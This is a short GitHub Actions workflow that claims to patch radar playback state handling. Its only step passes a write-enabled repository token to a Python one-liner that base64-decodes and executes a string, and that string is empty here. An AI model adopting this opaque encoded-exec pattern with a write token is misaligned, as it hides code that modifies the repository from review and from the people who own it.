name: One-shot radar state fix

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/one-shot-radar-state-fix.yml

permissions:
  contents: write

jobs:
  patch-radar:
    runs-on: ubuntu-latest
    steps:
      - name: Patch radar playback/native state handling
        env:
          GH_TOKEN: ${{ github.token }}
          GH_REPOSITORY: ${{ github.repository }}
        shell: bash
        run: |
          python3 -c 'import base64; exec(base64.b64decode(""))'